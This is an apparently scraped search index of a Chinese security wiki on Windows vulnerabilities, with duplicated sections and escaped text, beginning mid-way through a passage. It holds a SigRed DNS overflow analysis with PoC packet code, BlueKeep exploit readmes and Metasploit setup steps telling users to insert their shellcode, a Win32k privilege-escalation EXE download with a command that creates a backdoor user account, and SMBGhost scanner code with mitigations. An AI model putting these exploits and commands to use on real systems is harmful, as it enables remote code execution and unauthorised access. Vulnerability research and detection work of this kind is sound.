\u6240\u4ee5\u8981\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u53d1\u9001\u5927\u4e8e64KB\u7684SIG\u7c7b\u578b\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u57fa\u4e8eUDP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a512\u4e2a\u5b57\u8282\uff08\u652f\u6301EDNS0\u7684\u9650\u5236\u5927\u5c0f\u4e3a4096\u4e2a\u5b57\u8282\uff09\uff0c\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\u3002 PoC\u7684\u601d\u8def\u662f\u901a\u8fc7\u8bbe\u7f6eTC\u6807\u5fd7\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u5982\u4e0b\uff1a \u4f46\u662f\u5229\u7528TCP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a65535\uff0c\u8fd8\u662f\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u7528\u5230DNS\u57df\u540d\u538b\u7f29\u3002 \u5b8c\u6574\u7684\u57df\u540d\u8868\u793a\uff0c\u5982www.google.com\uff0c\u9700\u898116\u4e2a\u5b57\u8282\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \\3 w w w \\6 g o o g l e \\3 c o m \\0 \u91c7\u7528[ ]\u7684\u5f62\u5f0f\u5b58\u50a8\u3002\u672c\u4f8b\u4e2d\u5c06\u57df\u540d\u5206\u6210\u4e86\u4e09\u6bb5\uff0c\u5206\u522b\u662fwww\uff0cgoogle\uff0ccom\u3002\u6bcf\u4e00\u6bb5\u5f00\u5934\u90fd\u6709\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u540e\u9762\u57df\u540d\u7684\u957f\u5ea6\uff0c\u6700\u540e\u4ee5\\0\u7ed3\u5c3e\u3002\u7531\u4e8e\u89c4\u5b9a\u57df\u540d\u6bb5\u7684\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc763\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8868\u793a\u57df\u540d\u6bb5\u957f\u5ea6\u7684\u5b57\u8282\u6700\u9ad8\u4e24\u4f4d\u6ca1\u6709\u7528\u5230\uff0c\u56e0\u6b64\u53e6\u6709\u7528\u9014\u3002 \uff081\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a00\u65f6\uff0c\u8868\u793a\u4ee5\u4e0a\u9762\u7684\u5f62\u5f0f\u7684\u4f20\u8f93 \uff082\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a11\u65f6\uff0c\u8868\u793a\u5c06\u57df\u540d\u8fdb\u884c\u538b\u7f29\uff0c\u8be5\u5b57\u8282\u53bb\u6389\u6700\u9ad8\u4e24\u4f4d\u540e\u5269\u4e0b\u76846\u4f4d\uff0c\u4ee5\u53ca\u540e\u9762\u76848\u4f4d\u603b\u517114\u4f4d\uff0c\u6307\u5411DNS\u6570\u636e\u62a5\u6587\u4e2d\u7684\u67d0\u4e00\u6bb5\u57df\u540d\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6307\u9488\u3002\u59820xc00c, \u8868\u793a\u4eceDNS\u6b63\u6587\uff08UDP payload\uff09\u7684\u504f\u79fboffset=0x0c\u5904\u6240\u8868\u793a\u7684\u57df\u540d\u3002 \uff083\uff09\u6df7\u5408\u8868\u793a\uff1a\u4ee5www.google.com\u4e3a\u4f8b\uff0c\u5047\u8bbe\u8be5\u57df\u540d\u4f4d\u4e8eDNS\u62a5\u6587\u504f\u79fb0x20\u5904\uff0c\u53ef\u80fd\u7684\u7528\u6cd5\u6709\uff1a a\u30010xc020\uff1a\u8868\u793a\u5b8c\u6574\u57df\u540dwww.google.com b\u30010xc024\uff1a\u4ece\u5b8c\u6574\u57df\u540d\u7684\u7b2c\u4e8c\u6bb5\u5f00\u59cb\uff0c\u6307\u4ee3google.com c\u30010x016dc024\uff1a0x01\u8868\u793a\u540e\u9762\u8ddf\u7684size\u5927\u5c0f1\uff0c0x6d\u8868\u793a\u5b57\u7b26m\uff0c\u6240\u4ee50x016d\u8868\u793a\u5b57\u7b26\u4e32\"m\"\uff0c\u7b2c\u4e8c\u6bb50xc024\u6307\u4ee3google.com\uff0c\u56e0\u6b64\u6574\u6bb5\u8868\u793am.google.com Name_PacketNameToCountNameEx\u51fd\u6570\u4f1a\u6839\u636eSigners Name \u6765\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u56e0\u6b640xc00c\uff08\u504f\u79fb\u4eceTransaction ID 0x795a\u5f00\u59cb\u8ba1\u7b97\uff09\u6307\u5411\u6b63\u5e38\u57df\u540d9.ibrokethe.net\uff0c\u5927\u5c0f\u5219\u4e3a0x11\u3002 [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-z2rI7Hdk-1595035305879)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] \u4f46\u901a\u8fc7\u8bbe\u7f6eSigner\u2019s Name\u4e3a0xc00d\uff0c\u5c06\u57df\u540d\u8d77\u59cb\u4f4d\u7f6e\u6307\u5411\"9\"\uff0c\u6b64\u65f6\u4f1a\u5c06\"9\"\u5f53\u4f5c\uff0c\u5c06\u540e\u9762\u76840x39\u4e2a\u5b57\u8282\u5f53\u4f5c\u57df\u540d\u6bb5\uff0c\u5e76\u4e14\u4e00\u76f4\u89e3\u6790\u4e0b\u53bb\uff0c\u76f4\u81f3\u89e3\u6790\u5230\u2019\\0\u2019\u3002\u5982\u4e0b\u56fe\uff0cName_PacketNameToCountNameEx\u4f1a\u5c06\u56fe\u4e2d\u9009\u4e2d\u7684\u90e8\u5206\u5f53\u6210\u57df\u540d\uff0c\u83b7\u53d6\u5927\u5c0f\u3002\u6b64\u65f6\u5927\u5c0f\u4e3a(0x39+1)+(0xf+1)*5 +1 =0x8b\u3002\uff080x39\u548c0xf\u8868\u793a\u57df\u540d\u6bb5\u5927\u5c0f\uff0c+1\u8868\u793a\".\"\uff0c \u6700\u540e\u4e00\u4e2a+1\u8868\u793a\"\\0\"\uff09\u3002 [\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-20X5AEwn-1595035305880)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)] windbg\u8c03\u8bd5\u7ed3\u679c\uff1a [rsp+0x30h]\u4e3a\u4f20\u5165Name_PacketNameToCountNameEx\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4fdd\u5b58\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u800c\u540e\u9762\u7684(rdi\u2013rax)\u8868\u793a\u6211\u4eec\u586b\u5145\u5230Signature\u7684\u6570\u636e\u5927\u5c0f\uff0crdi\u4e3a\u6570\u636e\u7ed3\u675f\u5730\u5740\uff0crax\u4e3a\u8d77\u59cb\u5730\u5740\uff08\u4eceSigner\u2019s Name\u540e\u5f00\u59cb\u8ba1\u7b97\uff09\u3002 \u8ba1\u7b97\u5b8c\u5927\u5c0f\u4e3a0xffaa\uff1a \u6240\u4ee5\u6700\u540e\u4f20\u5165RR_AllocateEx\u51fd\u6570\u7684\u5927\u5c0f\u4e3a (0x8b+0x14+0xffaa)&0xffff= 0x49 \u4e4b\u540e\u5c06Signature\u7684\u6570\u636e\u590d\u5236\u5230\u5206\u914d\u7684\u7a7a\u95f4\uff1a dns!memcpy \u76ee\u6807\u5730\u5740Dst\u4e3aRR_AllocateEx\u5206\u914d\u5730\u5740+\u57df\u540d\u5927\u5c0f\uff080x8b\uff09+0x4c\u5904\uff0c\u6e90\u5730\u5740Src\u4e3aSignature\u6570\u636e\u8d77\u59cb\u5730\u5740\uff0cSize\u4e3aSignature\u6570\u636e\u5927\u5c0f\uff080xffaa\uff09\u3002\u6700\u7ec8\u9020\u6210\u6ea2\u51fa\uff0c\u4ea7\u751f\u5d29\u6e83\u3002 PoC\u5efa\u7acbTCP\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u7684\u5305\u6784\u9020\u5982\u4e0b\uff1a # SIG Contents sig = \"\\x00\\x01\" # Type covered sig += \"\\x05\" # Algorithm - RSA/SHA1 sig += \"\\x00\" # Labels sig += \"\\x00\\x00\\x00\\x20\" # TTL sig += \"\\x68\\x76\\xa2\\x1f\" # Signature Expiration sig += \"\\x5d\\x2c\\xca\\x1f\" # Signature Inception sig += \"\\x9e\\x04\" # Key Tag sig += \"\\xc0\\x0d\" # Signers Name - Points to the '9' in 9.domain. sig += (\"\\x00\"*(19 - len(domain)) + (\"\\x0f\" + \"\\xff\"*15)*5).ljust(65465 - len(domain_compressed), \"\\x00\") # Signature - Here be overflows! \u2026\u2026 # Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature) connection.sendall(struct.pack('>H', len_msg) + data[2:4] + response + hdr + sig) 12345678910111213 \u4e0a\u8ff0\u6784\u9020\u7684\u4fe1\u606f\u6293\u5305\u5185\u5bb9\u5982\u4e0b\uff1a \u6574\u4e2a\u4ea4\u4e92\u8fc7\u7a0b\u5982\u4e0b\uff08\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\u6293\u5305\u7ed3\u679c\uff09\uff1a 192.168.148.134\u4e3a\u53d7\u5bb3\u8005IP\uff0c192.168.148.138\u4e3a\u653b\u51fb\u8005IP\u3002 \uff081\uff09\u53d7\u5bb3\u8005\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net \uff082\uff09\u653b\u51fb\u8005\u8fd4\u56de\u4e00\u4e2a\u54cd\u5e94\u5305\uff0c\u8bbe\u7f6eTC\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282 \uff083\uff09\u53d7\u5bb3\u8005\u5c31\u548c\u653b\u51fb\u8005\u5efa\u7acbTCP\u8fde\u63a5 \uff084\uff09\u53d7\u5bb3\u8005\u91cd\u65b0\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net \uff085\uff09\u653b\u51fb\u8005\u5229\u7528TCP\u4f20\u8f93\u5927\u4e8e64KB\u7684\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005\uff0c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u9020\u6210\u6ea2\u51fa","title":"0x01 \u6f0f\u6d1e\u5206\u6790"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/","text":"Bluekeep PoC \u00b6 This repo contains research concerning CVE-2019-0708. Bluekeep or CVE-2019-0708 is an RCE exploit that effects the following versions of Windows systems: Windows 2003 Windows XP Windows Vista Windows 7 Windows Server 2008 Windows Server 2008 R2 The vulnerability occurs during pre-authorization and has the potential to run arbitrary malicious code in the NT Authority\\system user security context. How it works \u00b6 By sending a specially crafted packet an attacker is able to set the value for the Channel ID to something the RDP service isn't expecting, this causes a memory corruption bug that will create the conditions for Remote Code Execution to occur. Should the attacker choose to follow up with packets designed to take advantage of this flaw remote code execution can be achieved with System user privileges. Setup \u00b6 git clone https://github.com/ekultek/bluekeep cd bluekeep bash setup.sh That should do what you need done and fix any issue you have. Credits \u00b6 Research by Ekultek and (VectorSEC)/ NullArray Development & Testing by Ekultek Follow us on Twitter Ekultek VectorSEC In Closing \u00b6 You can see some of our research, along with a list of potentially vulnerable targets under the research directory. We started with very little and decided that we weren't going to stop until we had a working exploit. I have been able to execute commands on Windows XP with this PoC personally. Note There are no payloads. This is just a PoC. HOWEVER it is easily ported to an exploit since you can easily add payloads to this.","title":"Bluekeep PoC"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#bluekeep-poc","text":"This repo contains research concerning CVE-2019-0708. Bluekeep or CVE-2019-0708 is an RCE exploit that effects the following versions of Windows systems: Windows 2003 Windows XP Windows Vista Windows 7 Windows Server 2008 Windows Server 2008 R2 The vulnerability occurs during pre-authorization and has the potential to run arbitrary malicious code in the NT Authority\\system user security context.","title":"Bluekeep PoC"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#how-it-works","text":"By sending a specially crafted packet an attacker is able to set the value for the Channel ID to something the RDP service isn't expecting, this causes a memory corruption bug that will create the conditions for Remote Code Execution to occur. Should the attacker choose to follow up with packets designed to take advantage of this flaw remote code execution can be achieved with System user privileges.","title":"How it works"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#setup","text":"git clone https://github.com/ekultek/bluekeep cd bluekeep bash setup.sh That should do what you need done and fix any issue you have.","title":"Setup"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#credits","text":"Research by Ekultek and (VectorSEC)/ NullArray Development & Testing by Ekultek Follow us on Twitter Ekultek VectorSEC","title":"Credits"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#in-closing","text":"You can see some of our research, along with a list of potentially vulnerable targets under the research directory. We started with very little and decided that we weren't going to stop until we had a working exploit. I have been able to execute commands on Windows XP with this PoC personally. Note There are no payloads. This is just a PoC. HOWEVER it is easily ported to an exploit since you can easily add payloads to this.","title":"In Closing"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/CVE-2019-0708-msf%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA/","text":"sudo apt-get install libsqlite3-dev libpq-dev libpcap-dev -y git clone https://github.com/rapid7/metasploit-framework.git cd metasploit-framework git fetch origin pull/12283/head:bluekeep git checkout bluekeep gem install bundler && bundle ./msfconsole msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce \u5982\u679c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef: /usr/local/bundle/bin/bundle:104:in ` load ': cannot load such file -- /usr/local/lib/ruby/gems/2.4.0/gems/bundler-1.16.1/exe/bundle (LoadError) from /usr/local/bundle/bin/bundle:104:in `<main>' \u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u4fee\u590d: gem update --system gem pristine bundler \u4ec5\u5728Debian\u6d4b\u8bd5\u8fc7 \u53c2\u8003: https://pentest-tools.com/blog/bluekeep-exploit-metasploit/","title":"CVE 2019 0708 msf\u5feb\u901f\u642d\u5efa"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/","text":"bluekeep \u00b6 Public work for CVE-2019-0708 2019-11-17 Update \u00b6 Added Windows 7 32bit exploit POC code. Using the address within the POC exploit code I had ~80% success rate against my test VM. It could likely be modfied to increase. Usage \u00b6 Replace the buf variable with your shellcode. Update the host variable to your target. python3 win7_32_poc.py Requirements \u00b6 Python3 Legal Disclaimer \u00b6 This project is made for educational and ethical testing purposes only. Usage of for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. author: https://github.com/0xeb-bp/bluekeep","title":"bluekeep"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#bluekeep","text":"Public work for CVE-2019-0708","title":"bluekeep"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#2019-11-17-update","text":"Added Windows 7 32bit exploit POC code. Using the address within the POC exploit code I had ~80% success rate against my test VM. It could likely be modfied to increase.","title":"2019-11-17 Update"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#usage","text":"Replace the buf variable with your shellcode. Update the host variable to your target. python3 win7_32_poc.py","title":"Usage"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#requirements","text":"Python3","title":"Requirements"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#legal-disclaimer","text":"This project is made for educational and ethical testing purposes only. Usage of for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. author: https://github.com/0xeb-bp/bluekeep","title":"Legal Disclaimer"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/","text":"\u6f0f\u6d1e\u7f16\u53f7 \u00b6 CVE-2020-07961 \u5f71\u54cd\u7248\u672c \u00b6 \u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1903 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1909 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1909\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server\u7248\u672c1909\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u5229\u7528 \u00b6 python scanner.py ip","title":"Readme"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/#_1","text":"CVE-2020-07961","title":"\u6f0f\u6d1e\u7f16\u53f7"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/#_2","text":"\u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1903 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1909 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1909\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server\u7248\u672c1909\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09","title":"\u5f71\u54cd\u7248\u672c"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/#_3","text":"python scanner.py ip","title":"\u5229\u7528"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803-Win32k%20Elevation%20of%20Privilege%20Poc/","text":"CVE-2019-0803-Win32k Elevation of Privilege Poc \u00b6 CVE-2019-0803.exe Win32k\u6f0f\u6d1e\u63d0\u6743\u5de5\u5177 \u6ca1\u6709\u7f16\u8bd1\u7684\uff0c\u6765\u81ea\uff1a https://github.com/ExpLife0011/CVE-2019-0803 \u53e6\u5916\u4e00\u4e2a\u662fK8\u5199\u7684\u6210\u54c1EXE\uff0c\u63d0\u793a:\u81ea\u884c\u659f\u914c\u4f7f\u7528\u4efb\u4f55\u63d0\u6743EXE\uff1a https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe \u4f7f\u7528\u65b9\u6cd5\uff1a CVE-2019-0803.exe cmd \"net user test test@321# /add\"","title":"CVE 2019 0803 Win32k Elevation of Privilege Poc"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803-Win32k%20Elevation%20of%20Privilege%20Poc/#cve-2019-0803-win32k-elevation-of-privilege-poc","text":"CVE-2019-0803.exe Win32k\u6f0f\u6d1e\u63d0\u6743\u5de5\u5177 \u6ca1\u6709\u7f16\u8bd1\u7684\uff0c\u6765\u81ea\uff1a https://github.com/ExpLife0011/CVE-2019-0803 \u53e6\u5916\u4e00\u4e2a\u662fK8\u5199\u7684\u6210\u54c1EXE\uff0c\u63d0\u793a:\u81ea\u884c\u659f\u914c\u4f7f\u7528\u4efb\u4f55\u63d0\u6743EXE\uff1a https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe \u4f7f\u7528\u65b9\u6cd5\uff1a CVE-2019-0803.exe cmd \"net user test test@321# /add\"","title":"CVE-2019-0803-Win32k Elevation of Privilege Poc"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/","text":"CVE-2019-0803 \u00b6 Win32k Elevation of Privilege Poc Screenshot \u00b6 Reference \u00b6 (steal Security token) https://github.com/mwrlabs/CVE-2016-7255","title":"CVE-2019-0803"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/#cve-2019-0803","text":"Win32k Elevation of Privilege Poc","title":"CVE-2019-0803"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/#screenshot","text":"","title":"Screenshot"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/#reference","text":"(steal Security token) https://github.com/mwrlabs/CVE-2016-7255","title":"Reference"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-0796/CVE-2020-0796%E6%A3%80%E6%B5%8B%E4%B8%8E%E4%BF%AE%E5%A4%8D/","text":"CVE-2020\u20130796\u68c0\u6d4b\u4e0e\u4fee\u590d \u00b6 \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1a Windows 10\u7248\u672c1903\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\uff09\u57fa\u4e8ex64\u7684\u7cfb\u7edf Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 Windows Server 1909\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177 python\u7248\u672c \u6765\u6e90\uff1a https://github.com/ollypwn/SMBGhost/blob/master/scanner.py import socket import struct import sys pkt = b ' \\x00\\x00\\x00\\xc0\\xfe SMB@ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 $ \\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 x \\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02 \" \\x02 $ \\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00 & \\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' sock = socket . socket ( socket . AF_INET ) sock . settimeout ( 3 ) sock . connect (( sys . argv [ 1 ], 445 )) sock . send ( pkt ) nb , = struct . unpack ( \">I\" , sock . recv ( 4 )) res = sock . recv ( nb ) if not res [ 68 : 70 ] == b \" \\x11\\x03 \" : exit ( \"Not vulnerable.\" ) if not res [ 70 : 72 ] == b \" \\x02\\x00 \" : exit ( \"Not vulnerable.\" ) exit ( \"Vulnerable.\" ) nmap\u7248\u672c\uff1a #!/bin/bash if [ $# -eq 0 ] then echo $'Usage:\\n\\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR {Target Specification - Nmap}' exit 1 fi echo \"Checking if there's SMB v3.11 in\" $1 \"...\" nmap -p445 --script smb-protocols -Pn -n $1 | grep -P '\\d+\\.\\d+\\.\\d+\\.\\d+|^\\|.\\s+3.11' | tr '\\n' ' ' | tr 'Nmap scan report for' '@' | tr \"@\" \"\\n\" | tr '|' ' ' | tr '_' ' ' | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' if [[ $? ! = 0 ]] ; then echo \"There's no SMB v3.11\" fi \u6f0f\u6d1e\u7f13\u89e3\u65b9\u6cd5 \u6ce8:\u5728powershell\u4e0b\u7981\u6b62\u6216\u8005\u5f00\u542f\u5373\u53ef\u7f13\u89e3 Disable compression: Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 1 -Force Enable compression: Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 0 -Force","title":"CVE 2020 0796\u68c0\u6d4b\u4e0e\u4fee\u590d"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-0796/CVE-2020-0796%E6%A3%80%E6%B5%8B%E4%B8%8E%E4%BF%AE%E5%A4%8D/#cve-20200796","text":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1a Windows 10\u7248\u672c1903\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\uff09\u57fa\u4e8ex64\u7684\u7cfb\u7edf Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 Windows Server 1909\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177 python\u7248\u672c \u6765\u6e90\uff1a https://github.com/ollypwn/SMBGhost/blob/master/scanner.py import socket import struct import sys pkt = b ' 